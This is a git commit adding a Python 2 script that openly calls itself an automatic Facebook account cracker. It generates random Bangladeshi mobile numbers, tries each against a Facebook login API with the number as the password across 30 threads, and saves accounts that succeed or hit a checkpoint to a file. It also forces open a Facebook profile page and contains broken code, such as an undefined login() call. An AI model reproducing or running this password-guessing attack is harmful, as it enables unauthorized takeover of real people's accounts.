585abd7307402b0b2b96e49bf2cbbdb6599c76b3
rakib5689 <83423901+rakib5689@users.noreply.github.com>
2022-06-01 22:49:27 +0600

    Create Ariyen.py

---
+++ Ariyen.py
@@ -0,0 +1,378 @@
+# Decompile by Ariyen Islam Rony (Tools By Ariyen)
+# Time Succes decompile : 2022-05-09 14:30:34.795257
+
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+os.system('rm -rf .txt')
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+psb('\x1b[1;32mBANGLADESH 11 DIGIT CLONING START PLEASE WAIT ..........')
+for n in range(99000):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+    
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    
+
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def exb():
+    print '[!] Exit'
+    os.sys.exit()
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(3.0 / 200)
+
+
+def tik():
+    titik = [
+     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
+    for o in titik:
+        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mLoa\x1b[1;90mding \x1b[1;90m' + o,
+        sys.stdout.flush()
+        time.sleep(0.5)
+        
+
+
+
+  
+ 
+def lodhirt():
+    lodhirt = [
+     '' '      ', 'D A R K C Y B E R', '      ', 'D A R K C Y B E R', '      ', 'D A R K C Y B E R', '      ', 'D A R K C Y B E R', '      ', 'D A R K C Y B E R', '      ', 'D A R K C Y B E R', '      ', 'D A R K C Y B E R', '      ', 'D A R K C Y B E R', 'D A R K C Y B E R', '      ', 'D A R K C Y B E R', '      ', 'D A R K C Y B E R', '      ', 'D A R K C Y B E R', '      ', 'D A R K C Y B E R', '      ', 'D A R K C Y B E R', '      ', 'D A R K C Y B E R', '      ', 'D A R K C Y B E R', '      ', 'D A R K C Y B E R', '      ', 'D A R K C Y B E R\n']
+    for o in lodhirt:
+        print '\r\x1b[1;94m                     \x1b[1;92m' + o,
+        
+        
+        sys.stdout.flush()
+        time.sleep(00.01)
+ 
+    os.system('clear')
+
+
+logo = """
+\033[0;91m░
+   ▒███████▒ ██▓ ▄▄▄      
+    ▒ ▒ ▒ ▄▀░▓██▒▒████▄    
+░ ▒ ▄▀▒░ ▒██▒▒██  ▀█▄  
+  ▄▀▒   ░░██░░██▄▄▄▄██ 
+▒███████▒░██░ ▓█   ▓██▒
+░▒▒ ▓░▒░▒░▓   ▒▒   ▓▒█░
+░░▒ ▒ ░ ▒ ▒ ░  ▒   ▒▒ ░
+░ ░ ░ ░ ░ ▒ ░  ░   ▒   
+  ░ ░     ░        ░  ░ Ariyen Islam Rony
+░                      
+
+\033[0;92m
+\033[0;93m
+ \033[1;90m
+ \033[1;94m
+ \033[1;95m
+
+        \n\n\x1b[1;90m -------------------------\x1b[1;90m D A R K C Y B E R Ariyen\n\x1b[1;90m -------------------------\n\n\x1b[1;90m        AUTOMATIC ACCOUNT CRACKER BY \x1b[1;90mSHANTO\n\x1b[1;90m--------------------------------------------------\n\x1b[1;92m\n AUTHOR     : D A R K C Y B E R\n FACEBOOK   : FACEBOOK.COM/SHANTO.VAU404\n YOUTUBE    : SHANTO HASAN\n GITHUB     : GITHUB.COM/DARK-CYBER-07\n\x1b[1;90m\n--------------------------------------------------\n   """
+           
+           
+           
+def jaalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(2.0 / 9900)
+
+
+
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+
+print """
+
+\033[0;95m▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀      
+\033[0;96m▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒       
+\033[0;92m░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░       
+\033[0;91m░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄       
+\033[0;94m░▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄      
+ \033[0;93m▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒      
+\033[0;92m ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░      
+ \033[0;91m░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░       
+  \033[0;96m ░          ░  ░   ░     ░  ░         
+\033[0;93m ░                                      
+ \033[0;92m▄████▄▓██   ██▓ ▄▄▄▄   ▓█████  ██▀███  
+\033[0;94m▒██▀ ▀█ ▒██  ██▒▓█████▄ ▓█   ▀ ▓██ ▒ ██▒
+\033[0;96m▒▓█    ▄ ▒██ ██░▒██▒ ▄██▒███   ▓██ ░▄█ ▒
+\033[0;91m▒▓▓▄ ▄██▒░ ▐██▓░▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  
+\033[0;92m▒ ▓███▀ ░░ ██▒▓░░▓█  ▀█▓░▒████▒░██▓ ▒██▒
+\033[0;95m░ ░▒ ▒  ░ ██▒▒▒ ░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░
+\033[0;94m  ░  ▒  ▓██ ░▒░ ▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░
+\033[0;96m░       ▒ ▒ ░░   ░    ░    ░     ░░   ░ 
+\033[0;92m░ ░     ░ ░      ░         ░  ░   ░     
+\033[0;94m░       ░ ░           ░ Coded By  Ariyen Islam Rony              
+                                                                  
+        \n\n\x1b[1;90m -------------------------\x1b[1;90m D A R K C Y B E R Ariyen\n\x1b[1;90m -------------------------\n\n\x1b[1;90m        AUTOMATIC ACCOUNT CRACKER BY \x1b[1;90mSHANTO\n\x1b[1;90m--------------------------------------------------\n\x1b[1;92m\n AUTHOR     : D A R K C Y B E R\n FACEBOOK   : FACEBOOK.COM/SHANTO.VAU404\n YOUTUBE    : SHANTO HASAN\n GITHUB     : GITHUB.COM/DARK-CYBER-07\n\x1b[1;90m\n--------------------------------------------------\n   """
+           
+CorrectUsername = "Ariyen Islam"
+CorrectPassword = "Rony007"
+
+loop = 'true'
+while (loop == 'true'):
+    username = raw_input("\033[1;91m \x1b[1;92mUSERNME \x1b[1;92m: \x1b[1;92m")
+    if (username == CorrectUsername):
+    	password = raw_input("\033[1;91m \x1b[1;92mPASSWORD \x1b[1;92m: \x1b[1;92m")
+        if (password == CorrectPassword):
+            print "Logged in successfully as " + username #Dev:SHANTO
+	    time.sleep(2)
+            loop = 'false'
+        else:
+            print "\033[1;97mWrong Password"
+            os.system('xdg-open https://www.facebook.com/Lover.boy194ariyen4islam3rony/')
+    else:
+        print "\033[1;97mWrong Username"
+        os.system('xdg-open https://www.facebook.com/Lover.boy194ariyen4islam3rony/')
+        
+        
+name= raw_input("\033[1;92m\x1b[1;92m Enter Your Name: ")
+
+os.system('xdg-open https://www.facebook.com/Lover.boy194ariyen4islam3rony/')
+        
+
+
+def menu():
+    os.system('clear')
+    print logo
+    print '\x1b[1;92mONLY 11 DIGITS HACKABLE ACCOUNTS ARE AVAILABLE'
+    print
+    jalan('\x1b[1;92m[01]  \x1b[1;92mGRAMEENPHONE')
+    jalan('\x1b[1;96m[02]  \x1b[1;96mGrameemphone\x1b[1;91m  (Merror)')
+    jalan('\x1b[1;92m[03]  \x1b[1;92mROBI')
+    jalan('\x1b[1;96m[04]  \x1b[1;96mAIRTEL')
+    jalan('\x1b[1;92m[05]  \x1b[1;92mBANGLALINK')
+    jalan('\x1b[1;96m[06]  \x1b[1;96mBanglalink\x1b[1;91m  (Merror)')
+    jalan('\x1b[1;92m[07]  \x1b[1;92mTELETALK')
+    print
+    jalan('\x1b[1;90m[00] EXIT')
+    print 50 * '-'
+    action()
+
+
+def action():
+    global cpb
+    global oks
+    bch = raw_input('\n\x1b[1;92m\xe2\x96\x84\xef\xb8\xbb\xcc\xb7\xcc\xbf\xe2\x94\xbb\xcc\xbf\xe2\x95\x90\xe2\x94\x81\xe4\xb8\x80  ')
+    if bch == '':
+        print '[!] Fill in correctly'
+        action()
+    elif bch == '1':
+        os.system('clear')
+        print logo
+        print
+        try:
+            c = raw_input(' TYPE ANY 2 DIGIT NUMBER :  ')
+            k = '+88017'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '2':
+        os.system('clear')
+        print logo
+        print
+        try:
+            c = raw_input(' TYPE ANY 2 DIGIT NUMBER :  ')
+            k = '+88013'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '3':
+        os.system('clear')
+        print logo
+        print
+        try:
+            c = raw_input(' TYPE ANY 2 DIGIT NUMBER :  ')
+            k = '+88018'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            sys.stdout = open('python2 SYS.py')
+            menu()
+
+    elif bch == '4':
+        os.system('clear')
+        print logo
+        print
+        try:
+            c = raw_input(' TYPE ANY 2 DIGIT NUMBER :  ')
+            k = '+88016'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '5':
+        os.system('clear')
+        print logo
+        print
+        try:
+            c = raw_input(' TYPE ANY 2 DIGIT NUMBER :  ')
+            k = '+88019'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+            
+    elif bch == '6':
+        os.system('clear')
+        print logo
+        print
+        try:
+            c = raw_input(' TYPE ANY 2 DIGIT NUMBER :  ')
+            k = '+88014'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+                
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+    elif bch == '7':
+        os.system('clear')
+        print logo
+        print
+        try:
+            c = raw_input(' TYPE ANY 2 DIGIT NUMBER :  ')
+            k = '+88015'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+            
+    
+        os.system('pkg install git')
+    elif bch == '00':
+        exb()
+    else:
+        print '[!] Fill in correctly'
+        action()
+        
+    print 47 * '\x1b[1;91m\xe2\x96\x80\x1b[1;92m\xe2\x96\x80'
+    xxx = str(len(id))
+    psb('\x1b[1;92m[\xe2\x9c\x94] TOTAL NUMBER: ' + xxx)
+    time.sleep(0.5)
+    psb('\x1b[1;93m[\xe2\x9c\x93]\x1b[1;93m PLEASE WAIT, PROSESS RUNNING \033[0;92mX \033[0;95mX...')
+    time.sleep(0.5)
+    psb('\x1b[1;94m[\xe2\x9c\x93]\x1b[1;94m ON OFF FLIGHT MODE IF NO RESULT')
+    time.sleep(0.5)  
+    psb('\x1b[1;91m[!] TO STOP PROSESSS PRESS CTRL THEN PRESS Z')
+    time.sleep(0.5)
+    print 47 * '\x1b[1;91m\xe2\x96\x80\x1b[1;92m\xe2\x96\x80'
+    print
+
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+
+        try:
+            result = k + c + user
+            digi11 = result[3:14]
+            pass1 = digi11
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\n\x1b[1;92m[SUCCESSFULL] ' + k + c + user + '   \x1b[1;92m<==>\x1b[1;92m   ' + pass1 + '  \x1b[1;92m[ LOG IN NOW ]\n'
+                okb = open('save/cloned.txt', 'a')
+                okb.write(k + c + user + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\n\x1b[1;91m[CHECKPOINT] ' + k + c + user + '  \x1b[1;91m<==>\x1b[1;93m   ' + pass1 + ' \x1b[1;91m[LOG IN AFTER 7 DAYS]\n'
+                cps = open('save/cloned.txt', 'a')
+                cps.write(k + c + user + pass1 + '\n')
+                cps.close()
+                cpb.append(c + user + pass1)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print '[\xe2\x9c\x93] \x1b[1;96mPROCESS HAS BEEN COMPLETED....'
+    print '[\xe2\x9c\x93] \x1b[1;96mTOTAL HACKED/CHECKPOINT : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '[\xe2\x9c\x93] \x1b[1;96mCP FILE HAS BEEN SAVED : save/checkpoint.txt'
+    raw_input('\n[\x1b[1;96mPRESS ENTER TO GO BACK]')
+    print 'THANKS FOR USING THIS TOOL LIKE AND FOLLOW MY Account'
+    print ''
+    print '\n    '
+    raw_input('\n\x1b[1;92m[\x1b[1;92mEXIT\x1b[1;92m]')
+    login()
+
+
+if __name__ == '__main__':
+    menu()
